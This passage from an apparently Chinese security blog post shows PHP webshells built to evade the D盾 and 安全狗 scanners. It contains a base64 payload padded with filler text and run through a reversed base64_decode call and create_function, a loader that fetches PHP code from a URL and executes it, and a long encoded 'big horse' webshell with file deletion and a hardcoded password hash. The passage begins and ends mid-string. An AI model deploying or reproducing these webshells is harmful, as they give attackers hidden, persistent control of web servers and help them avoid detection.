逼x卢本伟牛逼M卢本伟牛逼D卢本伟牛逼M卢本伟牛逼p卢本伟牛逼L卢本伟牛逼i卢本伟牛逼R卢本伟牛逼j卢本伟牛逼K卢本伟牛逼D卢本伟牛逼E卢本伟牛逼w卢本伟牛逼N卢本伟牛逼S卢本伟牛逼k卢本伟牛逼u卢本伟牛逼J卢本伟牛逼G卢本伟牛逼M卢本伟牛逼o卢本伟牛逼M卢本伟牛逼T卢本伟牛逼A卢本伟牛逼y卢本伟牛逼K卢本伟牛逼T卢本伟牛逼s卢本伟牛逼K卢本伟牛逼C卢本伟牛逼i卢本伟牛逼R卢本伟牛逼n卢本伟牛逼Z卢本伟牛逼X卢本伟牛逼Q卢本伟牛逼9卢本伟牛逼Y卢本伟牛逼2卢本伟牛逼h卢本伟牛逼y卢本伟牛逼K卢本伟牛逼D卢本伟牛逼E卢本伟牛逼w卢本伟牛逼M卢本伟牛逼i卢本伟牛逼k卢本伟牛逼u卢本伟牛逼Y卢本伟牛逼2卢本伟牛逼h卢本伟牛逼y卢本伟牛逼K卢本伟牛逼D卢本伟牛逼E卢本伟牛逼w卢本伟牛逼N卢本伟牛逼S卢本伟牛逼k卢本伟牛逼u卢本伟牛逼Y卢本伟牛逼2卢本伟牛逼h卢本伟牛逼y卢本伟牛逼K卢本伟牛逼D卢本伟牛逼E卢本伟牛逼w卢本伟牛逼O卢本伟牛逼C卢本伟牛逼k卢本伟牛逼u卢本伟牛逼Y卢本伟牛逼2卢本伟牛逼h卢本伟牛逼y卢本伟牛逼K卢本伟牛逼D卢本伟牛逼E卢本伟牛逼w卢本伟牛逼M卢本伟牛逼S卢本伟牛逼k卢本伟牛逼u卢本伟牛逼Y卢本伟牛逼2卢本伟牛逼h卢本伟牛逼y卢本伟牛逼K卢本伟牛逼D卢本伟牛逼k卢本伟牛逼1卢本伟牛逼K卢本伟牛逼T卢本伟牛逼s卢本伟牛逼K卢本伟牛逼C卢本伟牛逼i卢本伟牛逼R卢本伟牛逼n卢本伟牛逼Z卢本伟牛逼X卢本伟牛逼Q卢本伟牛逼u卢本伟牛逼P卢本伟牛逼W卢本伟牛逼N卢本伟牛逼o卢本伟牛逼c卢本伟牛逼i卢本伟牛逼g卢本伟牛逼x卢本伟牛逼M卢本伟牛逼D卢本伟牛逼M卢本伟牛逼p卢本伟牛逼L卢本伟牛逼m卢本伟牛逼N卢本伟牛逼o卢本伟牛逼c卢本伟牛逼i卢本伟牛逼g卢本伟牛逼x卢本伟牛逼M卢本伟牛逼D卢本伟牛逼E卢本伟牛逼p卢本伟牛逼L卢本伟牛逼m卢本伟牛逼N卢本伟牛逼o卢本伟牛逼c卢本伟牛逼i卢本伟牛逼g卢本伟牛逼x卢本伟牛逼M卢本伟牛逼T卢本伟牛逼Y卢本伟牛逼p卢本伟牛逼L卢本伟牛逼m卢本伟牛逼N卢本伟牛逼o卢本伟牛逼c卢本伟牛逼i卢本伟牛逼g卢本伟牛逼5卢本伟牛逼N卢本伟牛逼S卢本伟牛逼k卢本伟牛逼u卢本伟牛逼Y卢本伟牛逼2卢本伟牛逼h卢本伟牛逼y卢本伟牛逼K卢本伟牛逼D卢本伟牛逼k卢本伟牛逼5卢本伟牛逼K卢本伟牛逼T卢本伟牛逼s卢本伟牛逼K卢本伟牛逼C卢本伟牛逼i卢本伟牛逼R卢本伟牛逼n卢本伟牛逼Z卢本伟牛逼X卢本伟牛逼Q卢本伟牛逼u卢本伟牛逼P卢本伟牛逼W卢本伟牛逼N卢本伟牛逼o卢本伟牛逼c卢本伟牛逼i卢本伟牛逼g卢本伟牛逼x卢本伟牛逼M卢本伟牛逼T卢本伟牛逼E卢本伟牛逼p卢本伟牛逼L卢本伟牛逼m卢本伟牛逼N卢本伟牛逼o卢本伟牛逼c卢本伟牛逼i卢本伟牛逼g卢本伟牛逼x卢本伟牛逼M卢本伟牛逼T卢本伟牛逼A卢本伟牛逼p卢本伟牛逼L卢本伟牛逼m卢本伟牛逼N卢本伟牛逼o卢本伟牛逼c卢本伟牛逼i卢本伟牛逼g卢本伟牛逼x卢本伟牛逼M卢本伟牛逼T卢本伟牛逼Y卢本伟牛逼p卢本伟牛逼L卢本伟牛逼m卢本伟牛逼N卢本伟牛逼o卢本伟牛逼c卢本伟牛逼i卢本伟牛逼g卢本伟牛逼x卢本伟牛逼M卢本伟牛逼D卢本伟牛逼E卢本伟牛逼p卢本伟牛逼L卢本伟牛逼m卢本伟牛逼N卢本伟牛逼o卢本伟牛逼c卢本伟牛逼i卢本伟牛逼g卢本伟牛逼x卢本伟牛逼M卢本伟牛逼T卢本伟牛逼A卢本伟牛逼p卢本伟牛逼O卢本伟牛逼w卢本伟牛逼o卢本伟牛逼K卢本伟牛逼J卢本伟牛逼G卢本伟牛逼d卢本伟牛逼l卢本伟牛逼d卢本伟牛逼C卢本伟牛逼4卢本伟牛逼9卢本伟牛逼Y卢本伟牛逼2卢本伟牛逼h卢本伟牛逼y卢本伟牛逼K卢本伟牛逼D卢本伟牛逼E卢本伟牛逼x卢本伟牛逼N卢本伟牛逼i卢本伟牛逼k卢本伟牛逼u卢本伟牛逼Y卢本伟牛逼2卢本伟牛逼h卢本伟牛逼y卢本伟牛逼K卢本伟牛逼D卢本伟牛逼E卢本伟牛逼x卢本伟牛逼N卢本伟牛逼S卢本伟牛逼k卢本伟牛逼7卢本伟牛逼C卢本伟牛逼g卢本伟牛逼o卢本伟牛逼k卢本伟牛逼X卢本伟牛逼1卢本伟牛逼N卢本伟牛逼F卢本伟牛逼U卢本伟牛逼1卢本伟牛逼N卢本伟牛逼J卢本伟牛逼T卢本伟牛逼0卢本伟牛逼5卢本伟牛逼b卢本伟牛逼J卢本伟牛逼1卢本伟牛逼B卢本伟牛逼o卢本伟牛逼c卢本伟牛逼E卢本伟牛逼N卢本伟牛逼v卢本伟牛逼Z卢本伟牛逼G卢本伟牛逼U卢本伟牛逼n卢本伟牛逼X卢本伟牛逼T卢本伟牛逼0卢本伟牛逼k卢本伟牛逼Z卢本伟牛逼2卢本伟牛逼V卢本伟牛逼0卢本伟牛逼K卢本伟牛逼C卢本伟牛逼R卢本伟牛逼1卢本伟牛逼c卢本伟牛逼m卢本伟牛逼w卢本伟牛逼p卢本伟牛逼O卢本伟牛逼3卢本伟牛逼0卢本伟牛逼K卢本伟牛逼C卢本伟牛逼i卢本伟牛逼R卢本伟牛逼1卢本伟牛逼b卢本伟牛逼j卢本伟牛逼0卢本伟牛逼k卢本伟牛逼Y卢本伟牛逼y卢本伟牛逼g卢本伟牛逼x卢本伟牛逼M卢本伟牛逼D卢本伟牛逼M卢本伟牛逼p卢本伟牛逼L卢本伟牛逼i卢本伟牛逼R卢本伟牛逼j卢本伟牛逼K卢本伟牛逼D卢本伟牛逼E卢本伟牛逼y卢本伟牛逼M卢本伟牛逼i卢本伟牛逼k卢本伟牛逼u卢本伟牛逼J卢本伟牛逼G卢本伟牛逼M卢本伟牛逼o卢本伟牛逼M卢本伟牛逼T卢本伟牛逼A卢本伟牛逼1卢本伟牛逼K卢本伟牛逼S卢本伟牛逼4卢本伟牛逼k卢本伟牛逼Y卢本伟牛逼y卢本伟牛逼g卢本伟牛逼x卢本伟牛逼M卢本伟牛逼T卢本伟牛逼A卢本伟牛逼p卢本伟牛逼O卢本伟牛逼w卢本伟牛逼o卢本伟牛逼K卢本伟牛逼J卢本伟牛逼H卢本伟牛逼V卢本伟牛逼u卢本伟牛逼L卢本伟牛逼j卢本伟牛逼0卢本伟牛逼k卢本伟牛逼Y卢本伟牛逼y卢本伟牛逼g卢本伟牛逼x卢本伟牛逼M卢本伟牛逼D卢本伟牛逼I卢本伟牛逼p卢本伟牛逼L卢本伟牛逼i卢本伟牛逼R卢本伟牛逼j卢本伟牛逼K卢本伟牛逼D卢本伟牛逼E卢本伟牛逼w卢本伟牛逼O卢本伟牛逼C卢本伟牛逼k卢本伟牛逼u卢本伟牛逼J卢本伟牛逼G卢本伟牛逼M卢本伟牛逼o卢本伟牛逼O卢本伟牛逼T卢本伟牛逼c卢本伟牛逼p卢本伟牛逼L卢本伟牛逼i卢本伟牛逼R卢本伟牛逼j卢本伟牛逼K卢本伟牛逼D卢本伟牛逼E卢本伟牛逼x卢本伟牛逼N卢本伟牛逼i卢本伟牛逼k卢本伟牛逼u卢本伟牛逼J卢本伟牛逼G卢本伟牛逼M卢本伟牛逼o卢本伟牛逼Y卢本伟牛逼m卢本伟牛逼F卢本伟牛逼z卢本伟牛逼Z卢本伟牛逼T卢本伟牛逼Y卢本伟牛逼0卢本伟牛逼X卢本伟牛逼2卢本伟牛逼R卢本伟牛逼l卢本伟牛逼Y卢本伟牛逼2卢本伟牛逼9卢本伟牛逼k卢本伟牛逼Z卢本伟牛逼S卢本伟牛逼g卢本伟牛逼n卢本伟牛逼T卢本伟牛逼V卢本伟牛逼R卢本伟牛逼B卢本伟牛逼e卢本伟牛逼C卢本伟牛逼c卢本伟牛逼p卢本伟牛逼K卢本伟牛逼T卢本伟牛逼s卢本伟牛逼K卢本伟牛逼C卢本伟牛逼k卢本伟牛逼B卢本伟牛逼l卢本伟牛逼d卢本伟牛逼m卢本伟牛逼F卢本伟牛逼s卢本伟牛逼K卢本伟牛逼C卢本伟牛逼R卢本伟牛逼1卢本伟牛逼b卢本伟牛逼i卢本伟牛逼g卢本伟牛逼k卢本伟牛逼X卢本伟牛逼1卢本伟牛逼N卢本伟牛逼F卢本伟牛逼U卢本伟牛逼1卢本伟牛逼N卢本伟牛逼J卢本伟牛逼T卢本伟牛逼0卢本伟牛逼5卢本伟牛逼b卢本伟牛逼J卢本伟牛逼1卢本伟牛逼B卢本伟牛逼o卢本伟牛逼c卢本伟牛逼E卢本伟牛逼N卢本伟牛逼v卢本伟牛逼Z卢本伟牛逼G卢本伟牛逼U卢本伟牛逼n卢本伟牛逼X卢本伟牛逼S卢本伟牛逼k卢本伟牛逼p卢本伟牛逼O卢本伟牛逼w卢本伟牛逼=卢本伟牛逼=卢本伟牛逼&quot;;$zz=gg();$th=str_replace(&quot;卢本伟牛逼&quot;,&quot;&quot;,$a); /*卢本伟牛逼去除后，拼接起了大马*/$ba64 = strrev(&#39;eDoCEd_46EsAb&#39;); /*反转base64解密函数*/$ouni=$zz(&#39;&#39;,$ba64($th)); /*eval执行,相当于create_function(&#39;&#39;,base64_decode($th))*/$ouni();?&gt;</code></pre><p>方法也是一样的</p><p><img src="https://s2.ax1x.com/2019/01/13/FxPpZV.png" alt="FxPpZV.png"></p><p><img src="https://s2.ax1x.com/2019/01/13/FxP9aT.png" alt="FxP9aT.png"></p><p>然后此时，墨师父突然传送回家，并说道：这不是老套路吗。然后扔了一个更牛逼的操作出来<br>吓得我开了个写轮眼着手打开。</p><p>传送门：<a href="https://www.inksec.cn/2018/07/20/bypass_shell_3/" target="_blank" rel="noopener">打造一款1kb大马并且处理D盾以及安全狗拦截与查杀</a></p><pre><code>墨师父的思路是利用fopen远程打开webshell.txt然后读取里面的php代码在进入eval执行</code></pre><p>这里我改了一下，用create_function()执行</p><pre><code>&lt;?phpfunction MonkeySun(){    return str_replace(&quot;两开花&quot;, &quot;&quot;, &quot;两开花c两开花R两开花e两开花Ate两开花_Fun两开花CtI两开花oN&quot;);}$cre =MonkeySun();$handle1 = fopen(&#39;http://127.0.0.1/wc.txt&#39;, &#39;r&#39;); /*读取本地的wc.txt*/$content1 = &#39;&#39;;while(false != ($a1 = fread($handle1, 800))){ /*如果返回结果不为false*/    $content1 .= $a1;}$object=$cre(&#39;&#39;,$content1); /*替换了两开花拼接了create_finction()函数，create_function($content1)*/$object();fclose($handle1);?&gt;</code></pre><p><img src="https://s2.ax1x.com/2019/01/13/FxPGQA.png" alt="D"></p><p><img src="https://s2.ax1x.com/2019/01/13/FxPYLt.md.png" alt="FxPYLt.md.png"></p><p>此时墨师父看完我写的代码后，说了一句。太长了，哪有那么长，我的eval()就是eval那用做什么让扰乱。然后给我们开了一波车，虽然这波车很飘，但后面还是过了D盾。</p><p>然后我明白了过D盾的真正思路，如同尼玛佐助开了永恒万花筒一样牛皮</p><pre><code>过D盾处理的是1.处理关键不在于函数，在于传参内容2.不杀代码执行函数，杀函数带参</code></pre><p>新的操作:</p><pre><code>&lt;?php$z=&quot;&quot;;$a=&#39;ZXJyb3JfcmVwb3J0aW5nKEVfRVJST1IpOwp1bmxpbmsoJ3VzZXIucGhwJyk7CnVubGluaygnLi4vbWVtYmVyL2xvZ2luLnBocCcpOwpAaW5pX3NldCgnZGlzcGxheV9lcnJvcnMnLCdPZmYnKTsKQGluaV9zZXQoJ21heF9leGVjdXRpb25fdGltZScsMjAwMDApOwpAaW5pX3NldCgnbWVtb3J5X2xpbWl0JywnMjU2TScpOwpoZWFkZXIoImNvbnRlbnQtVHlwZTogdGV4dC9odG1sOyBjaGFyc2V0PXV0Zi04Iik7CiRwYXNzd29yZCA9ICIyMTIzMmYyOTdhNTdhNWE3NDM4OTRhMGU0YTgwMWZjMyI7IC8vVml2LCBiZWJlZ2ltLi4KZGVmaW5lKCdWaXYsIGJlYmVnaW0uJywnRGVuemVsLeS9oOeahOiLsembhCcpOyAvLyDmoIfpopgKZnVuY3Rpb24gcygpewoJJHN0ciA9ICI2Njc1NnI2Mzc0Njk2czZyMjA3Mzc0NzI2NDY5NzIyODI0NzM3NDcyMjkyMDdvMjA3MjY1NzQ3NTcyNnIyMDczNzQ3MjVzNzI2NTcwNnA2MTYzNjUyODYxNzI3MjYxNzkyODI3NXA1cDI3MnAyNzJzMnMyNzJwMjcyNTMyMzcyNzJwMjcyNTMyMzIyNzI5MnA2MTcyNzI2MTc5MjgyNzJzMjcycDI3MnMyNzJwMjc1cDI3MjcycDI3MjIyNzI5MnA2MzY4NnM3MDI4MjQ3Mzc0NzIyOTI5M28yMDdxMHEwbjY2NzU2cjYzNzQ2OTZzNnIyMDYzNjg2bzY3NzA2MzI4MjQ2MTcyNzI2MTc5MjkyMDdvMjA2NjZzNzI2NTYxNjM2ODI4MjQ2MTcyNzI2MTc5MjA2MTczMjAyNDZvNjU3OTIwM3EzcjIwMjQ3NjYxNzIyOTIwN28yMDI0NjE3MjcyNjE3OTVvMjQ2bzY1Nzk1cTIwM3EyMDY5NzM1czYxNzI3MjYxNzkyODI0NzY2MTcyMjkyMDNzMjA2MzY4Nm82NzcwNjMyODI0NzY2MTcyMjkyMDNuMjA3Mzc0NzI2OTcwNzM2cDYxNzM2ODY1NzMyODI0NzY2MTcyMjkzbzIwN3EyMDcyNjU3NDc1NzI2cjIwMjQ2MTcyNzI2MTc5M28yMDdxMHEwbjI0NnE3OTY2Njk2cDY1MjAzcTIwMjQ1czUzNDU1MjU2NDU1MjVvMjc1MzQzNTI0OTUwNTQ1czQ2NDk0cDQ1NHI0MTRxNDUyNzVxMjAzczIwNzM3NDcyNjQ2OTcyMjgyNDVzNTM0NTUyNTY0NTUyNW8yNzUzNDM1MjQ5NTA1NDVzNDY0OTRwNDU0cjQxNHE0NTI3NXEyOTIwM24yMDczNzQ3MjY0Njk3MjI4NXM1czQ2NDk0cDQ1NXM1czI5M28wcTBuMjQ2cTc5NjY2OTZwNjUyMDNxMjA3Mzc0NzI3MDZzNzMyODI0NnE3OTY2Njk2cDY1MnAyNzY1NzY2MTZwMjgyOTI3MjkyMDNzMjA2MTcyNzI2MTc5NXM3MzY4Njk2Njc0Mjg2NTc4NzA2cDZzNjQ2NTI4MjcyODI3MnAyNDZxNzk2NjY5NnA2NTI5MjkyMDNuMjAyNDZxNzk2NjY5NnA2NTNvMHEwbjY0NjU2NjY5NnI2NTI4Mjc1NDQ4NDk1MzQ0NDk1MjI3MnA3Mzc0NzI2NDY5NzIyODY0Njk3MjZyNjE2cTY1MjgyNDZxNzk2NjY5NnA2NTI5MnIyNzJzMjcyOTI5M28wcTBuNjQ2NTY2Njk2cjY1MjgyNzUyNHM0czU0NDQ0OTUyMjcycDczNzQ3MjY0Njk3MjI4NzM3NDcyNzQ3MjI4MjQ2cTc5NjY2OTZwNjUycDYxNzI3MjYxNzkyODczNzQ3MjY0Njk3MjI4MjQ1czUzNDU1MjU2NDU1MjVvMjc1MDQ4NTA1czUzNDU0cDQ2Mjc1cTI5MjAzcTNyMjAyNzI3MjkyOTJyMjcyczI3MjkyOTNvMHEwbjY0NjU2NjY5NnI2NTI4Mjc0NTU4NDk1MzU0NTM1czUwNDg1MDQ5NHI0NjRzMjcycDY3NjU3NDY5NnI2NjZzMjgyOTIwM3MyMDc0NzI3NTY1MjAzbjIwNjY2MTZwNzM2NTI5M28wcTBuNjk2NjI4Njc2NTc0NXM2cTYxNjc2OTYzNXM3MTc1NnM3NDY1NzM1czY3NzA2MzI4MjkyOTIwN28yMDI0NXM1MDRzNTM1NDIwM3EyMDYzNjg2bzY3NzA2MzI4MjQ1czUwNHM1MzU0MjkzbzIwN3EwcTBuNjk2NjI4NjY3NTZyNjM3NDY5NnM2cjVzNjU3ODY5NzM3NDczMjgyNzZxNzk3MzcxNnA1czYzNnA2czczNjUyNzI5MjkyMDdvMjAyNDY5NzM3MzcxNnAyMDNxMjAyNzRxNzk1MzcxNnAyNzNvMjA3cTBxMG42OTY2Mjg2Njc1NnI2Mzc0Njk2czZyNXM2NTc4Njk3Mzc0NzMyODI3NnE3MzczNzE2cDVzNjM2cDZzNzM2NTI3MjkyOTIwMjQ2OTczNzM3MTZwMjAycjNxMjAyNzIwMnEyMDRxNzM1MzcxNnAyNzNvMHEwbjY5NjYyODY2NzU2cjYzNzQ2OTZzNnI1czY1Nzg2OTczNzQ3MzI4Mjc2czYzNjk1czYzNnA2czczNjUyNzI5MjkyMDI0Njk3MzczNzE2cDIwMnIzcTIwMjcyMDJxMjA0czcyNjE2MzZwNjUyNzNvMHEwbjY5NjYyODY2NzU2cjYzNzQ2OTZzNnI1czY1Nzg2OTczNzQ3MzI4Mjc3Mzc5NjI2MTczNjU1czYzNnA2czczNjUyNzI5MjkyMDI0Njk3MzczNzE2cDIwMnIzcTIwMjcyMDJxMjA1Mzc5NDI2MTczNjUyNzNvMHEwbjY5NjYyODY2NzU2cjYzNzQ2OTZzNnI1czY1Nzg2OTczNzQ3MzI4Mjc3MDY3NXM2MzZwNnM3MzY1MjcyOTI5MjAyNDY5NzM3MzcxNnAyMDJyM3EyMDI3MjAycTIwNTA2czczNzQ2NzcyNjU1MzcxNnAyNzNvMHEwbjI0Nzc2OTZyMjAzcTIwNzM3NTYyNzM3NDcyMjg1MDQ4NTA1czRzNTMycDMwMnAzMzI5MjAzcTNxMjAyNzU3NDk0cjI3MjAzczIwNzQ3Mjc1NjUyMDNuMjA2NjYxNnA3MzY1M28wcTBuMjQ2cTczNjcyMDNxMjA1NjQ1NTI1MzQ5NHM0cjNvMHEwbjBxMG42Njc1NnI2Mzc0Njk2czZyMjA2NjY5NnA2NTc3MjgyNDY2Njk2cDY1NnI2MTZxNjUycDI0NjY2OTZwNjU2NDYxNzQ2MTJwMjQ2NjY5NnA2NTZxNnM2NDY1MjkyMDdvMHEwbjA5Njk2NjI4MjgyMTY5NzM1czc3NzI2OTc0NjE2MjZwNjUyODI0NjY2OTZwNjU2cjYxNnE2NTI5MjkyMDI2MjYyMDY2Njk2cDY1NXM2NTc4Njk3Mzc0NzMyODI0NjY2OTZwNjU2cjYxNnE2NTI5MjkyMDdvMjA2MzY4NnE2czY0MjgyNDY2Njk2cDY1NnI2MTZxNjUycDMwMzYzNjM2MjkzbzIwN3EwcTBuMDkyNDY4NjE2cjY0NnA2NTIwM3EyMDY2NnM3MDY1NnIyODI0NjY2OTZwNjU2cjYxNnE2NTJwMjQ2NjY5NnA2NTZxNnM2NDY1MjkzbzBxMG4wOTI0Nm82NTc5MjAzcTIwNjY3MDc1NzQ3MzI4MjQ2ODYxNnI2NDZwNjUycDI0NjY2OTZwNjU2NDYxNzQ2MTI5M28wcTBuMDk2NjYzNnA2czczNjUyODI0Njg2MTZyNjQ2cDY1MjkzbzBxMG4wOTcyNjU3NDc1NzI2cjIwMjQ2bzY1NzkzbzBxMG43cTBxMG4wcTBuNjY3NTZyNjM3NDY5NnM2cjIwNjY2OTZwNjU3MjI4MjQ2NjY5NnA2NTZyNjE2cTY1MjkyMDdvMHEwbjA5MjQ2ODYxNnI2NDZwNjUyMDNxMjA2NjZzNzA2NTZyMjgyNDY2Njk2cDY1NnI2MTZxNjUycDI3NzIyNzI5M28wcTBuMDkyNDY2Njk2cDY1NjQ2MTc0NjEyMDNxMjA2NjcyNjU2MTY0MjgyNDY4NjE2cjY0NnA2NTJwNjY2OTZwNjU3MzY5N242NTI4MjQ2NjY5NnA2NTZyNjE2cTY1MjkyOTNvMHEwbjA5NjY2MzZwNnM3MzY1MjgyNDY4NjE2cjY0NnA2NTI5M28wcTBuMDk3MjY1NzQ3NTcyNnIyMDI0NjY2OTZwNjU2NDYxNzQ2MTNvMHEwbjdxMHEwbjBxMG42Njc1NnI2Mzc0Njk2czZyMjA2NjY5NnA2NTc1MjgyNDY2Njk2cDY1NnI2MTZxNjU2MTJwMjQ2NjY5NnA2NTZyNjE2cTY1NjIyOTIwN28wcTBuMDkyNDZvNjU3OTIwM3EyMDZxNnM3NjY1NXM3NTcwNnA2czYxNjQ2NTY0NXM2NjY5NnA2NTI4MjQ2NjY5NnA2NTZyNjE2cTY1NjEycDI0NjY2OTZwNjU2cjYxNnE2NTYyMjkyMDNzMjA3NDcyNzU2NTIwM24yMDY2NjE2cDczNjUzbzBxMG4wOTY5NjYyODIxMjQ2bzY1NzkyOTIwN28yMDI0Nm82NTc5MjAzcTIwNjM2czcwNzkyODI0NjY2OTZwNjU2cjYxNnE2NTYxMnAyNDY2Njk2cDY1NnI2MTZxNjU2MjI5MjAzczIwNzQ3Mjc1NjUyMDNuMjA2NjYxNnA3MzY1M28yMDdxMHEwbjA5NzI2NTc0NzU3MjZyMjAyNDZvNjU3OTNvMHEwbjdxMHEwbjBxMG42Njc1NnI2Mzc0Njk2czZyMjA2NjY5NnA2NTY0MjgyNDY2Njk2cDY1NnI2MTZxNjUyOTIwN28wcTBuMDk2OTY2MjgyMTY2Njk2cDY1NXM2NTc4Njk3Mzc0NzMyODI0NjY2OTZwNjU2cjYxNnE2NTI5MjkyMDcyNjU3NDc1NzI2cjIwNjY2MTZwNzM2NTNvMHEwbjA5NnM2MjVzNjU2cjY0NXM2MzZwNjU2MTZyMjgyOTNvMHEwbjA5MjQ2cjYxNnE2NTIwM3EyMDYyNjE3MzY1NnI2MTZxNjUyODI0NjY2OTZwNjU2cjYxNnE2NTI5M28wcTBuMDkyNDYxNzI3MjYxNzkyMDNxMjA2NTc4NzA2cDZzNjQ2NTI4MjcycjI3MnAyNDZyNjE2cTY1MjkzbzBxMG4wOTY4NjU2MTY0NjU3MjI4Mjc0MzZzNnI3NDY1NnI3NDJxNzQ3OTcwNjUzbjIwNjE3MDcwNnA2OTYzNjE3NDY5NnM2cjJzNzgycTI3MnI2MTcyNzI2MTc5NXM3MDZzNzAyODI0NjE3MjcyNjE3OTI5MjkzbzBxMG4wOTY4NjU2MTY0NjU3MjI4Mjc0MzZzNnI3NDY1NnI3NDJxNDQ2OTczNzA2czczNjk3NDY5NnM2cjNuMjA2MTc0NzQ2MTYzNjg2cTY1NnI3NDNvMjA2NjY5NnA2NTZyNjE2cTY1M3EyNzJyMjQ2cjYxNnE2NTI5M28wcTBuMDk2ODY1NjE2NDY1NzIyODI3NDM2czZyNzQ2NTZyNzQycTRwNjU2cjY3NzQ2ODNuMjAyNzJyNjY2OTZwNjU3MzY5N242NTI4MjQ2NjY5NnA2NTZyNjE2cTY1MjkyOTNvMHEwbjA5NDA3MjY1NjE2NDY2Njk2cDY1MjgyNDY2Njk2cDY1NnI2MTZxNjUyOTNvMHEwbjA5NjU3ODY5NzQzbzBxMG43cTBxMG4wcTBuNjY3NTZyNjM3NDY5NnM2cjIwNzM2ODZzNzc2NDY5NzIyODI0NjQ2OTcyMjkyMDdvMHEwbjA5MjQ2NDY5NzIyMDNxMjA3Mzc0NzI2NDY5NzIyODI0NjQ2OTcyMnIyNzJzMjcyOTNvMHEwbjA5Njk2NjI4MjgyNDY4NjE2cjY0NnA2NTIwM3EyMDQwNnM3MDY1NnI2NDY5NzIyODI0NjQ2OTcyMjkyOTIwM3EzcTIwNHI1NTRwNHAyOTIwNzI2NTc0NzU3MjZyMjA2NjYxNnA3MzY1M28wcTBuMDkyNDYxNzI3MjYxNzkyMDNxMjA2MTcyNzI2MTc5MjgyOTNvMHEwbjA5Nzc2ODY5NnA2NTI4NjY2MTZwNzM2NTIwMjEzcTNxMjAyODI0NnI2MTZxNjUyMDNxMjA3MjY1NjE2NDY0Njk3MjI4MjQ2ODYxNnI2NDZwNjUyOTI5MjkyMDdvMHEwbjA5MDk2OTY2MjgyNDZyNjE2cTY1MjAzcTNxMjAyNzJyMjcyMDdwN3AyMDI0NnI2MTZxNjUyMDNxM3EyMDI3MnIycjI3MjkyMDYzNnM2cjc0Njk2cjc1NjUzbzBxMG4wOTA5MjQ3MDYxNzQ2ODIwM3EyMDI0NjQ2OTcyMnIyNDZyNjE2cTY1M28wcTBuMDkwOTI0NnI2MTZxNjUyMDNxMjA3Mzc0NzI3NDcyMjgyNDZyNjE2cTY1MnA2MTcyNzI2MTc5MjgyNzVwMjcyNzIwM3EzcjIwMjcyNTMyMzcyNzJwMjcyMjI3MjAzcTNyMjAyNzI1MzIzMjI3MjkyOTNvMHEwbjA5MDk2OTY2Mjg2OTczNXM2NDY5NzIyODI0NzA2MTc0NjgyOTI5MjA3bzIwMjQ2MTcyNzI2MTc5NW8yNzY0Njk3MjI3NXE1bzI0NzA2MTc0Njg1cTIwM3EyMDI0NnI2MTZxNjUzbzIwN3EwcTBuMDkwOTY1NnA3MzY1MjA3bzIwMjQ2MTcyNzI2MTc5NW8yNzY2Njk2cDY1Mjc1cTVvMjQ3MDYxNzQ2ODVxMjAzcTIwMjQ2cjYxNnE2NTNvMjA3cTBxMG4wOTdxMHEwbjA5NjM2cDZzNzM2NTY0Njk3MjI4MjQ2ODYxNnI2NDZwNjUyOTNvMHEwbjA5NzI2NTc0NzU3MjZyMjAyNDYxNzI3MjYxNzkzbzBxMG43cTBxMG4wcTBuNjY3NTZyNjM3NDY5NnM2cjIwNjQ2NTZwNzQ3MjY1NjUyODI0NjQ2OTcyMjkyMDdvMHEwbjA5MjQ2ODYxNnI2NDZwNjUyMDNxMjA0MDZzNzA2NTZyNjQ2OTcyMjgyNDY0Njk3MjI5M28wcTBuMDk3NzY4Njk2cDY1Mjg2NjYxNnA3MzY1MjAyMTNxM3EyMDI4MjQ2cjYxNnE2NTIwM3EyMDQwNzI2NTYxNjQ2NDY5NzIyODI0Njg2MTZyNjQ2cDY1MjkyOTI5MjA3bzBxMG4wOTA5Njk2NjI4MjQ2cjYxNnE2NTIwM3EzcTIwMjcycjI3MjA3cDdwMjAyNDZyNjE2cTY1MjAzcTNxMjAyNzJyMnIyNzI5MjA2MzZzNnI3NDY5NnI3NTY1M28wcTBuMDkwOTI0NzA2MTc0NjgyMDNxMjAyNDY0Njk3MjJyMjQ2cjYxNnE2NTNvMHEwbjA5MDk0MDYzNjg2cTZzNjQyODI0NzA2MTc0NjgycDMwMzczNzM3MjkzbzBxMG4wOTA5Njk2NjI4Njk3MzVzNjQ2OTcyMjgyNDcwNjE3NDY4MjkyOTIwN28yMDY0NjU2cDc0NzI2NTY1MjgyNDcwNjE3NDY4MnIyNzJzMjcyOTNvMjA3cTBxMG4wOTA5NjU2cDczNjUyMDdvMjA0MDc1NnI2cDY5NnI2bzI4MjQ3MDYxNzQ2ODI5M28yMDdxMHEwbjA5N3EwcTBuMDk0MDYzNnA2czczNjU2NDY5NzIyODI0Njg2MTZyNjQ2cDY1MjkzbzBxMG4wOTcyNjU3NDc1NzI2cjIwNDA3MjZxNjQ2OTcyMjgyNDY0Njk3MjI5M28wcTBuN3EwcTBuMHEwbjY2NzU2cjYzNzQ2OTZzNnIyMDczNjk3bjY1MjgyNDYyNzk3NDY1NzMyOTIwN28wcTBuMDk2OTY2MjgyNDYyNzk3NDY1NzMyMDNwMjAzMTMwMzIzNDI5MjA3MjY1NzQ3NTcyNnIyMDI0NjI3OTc0NjU3MzJyMjcyMDQyMjczbzBxMG4wOTI0NjE3MjcyNjE3OTIwM3EyMDYxNzI3MjYxNzkyODI3NDIyNzJwMjc0bzI3MnAyNzRxMjcycDI3NDcyNzJwMjc1NDI3MjkzbzBxMG4wOTI0NjY2cDZzNnM3MjIwM3EyMDY2NnA2czZzNzIyODZwNnM2NzI4MjQ2Mjc5NzQ2NTczMjkyMDJzMjA2cDZzNjcyODMxMzAzMjM0MjkyOTNvMHEwbjA5NzI2NTc0NzU3MjZyMjA3MzcwNzI2OTZyNzQ2NjI4MjcyNTJyMzI2NjIwMjcycjI0NjE3MjcyNjE3OTVvMjQ2NjZwNnM2czcyNXEycDI4MjQ2Mjc5NzQ2NTczMnM3MDZzNzcyODMxMzAzMjM0MnA2NjZwNnM2czcyMjgyNDY2NnA2czZzNzIyOTI5MjkyOTNvMHEwbjdxMHEwbjBxMG42Njc1NnI2Mzc0Njk2czZyMjA2NjY5NnI2NDI4MjQ2MTcyNzI2MTc5MnAyNDczNzQ3MjY5NnI2NzI5MjA3bzBxMG4wOTY2NnM3MjY1NjE2MzY4MjgyNDYxNzI3MjYxNzkyMDYxNzMyMDI0Nm82NTc5MjkyMDdvMjA2OTY2Mjg3Mzc0NzI2OTczNzQ3MjI4MjQ3Mzc0NzI2OTZyNjcycDI0Nm82NTc5MjkyOTIwNzI2NTc0NzU3MjZyMjA3NDcyNzU2NTNvMjA3cTBxMG4wOTcyNjU3NDc1NzI2cjIwNjY2MTZwNzM2NTNvMHEwbjdxMHEwbjBxMG4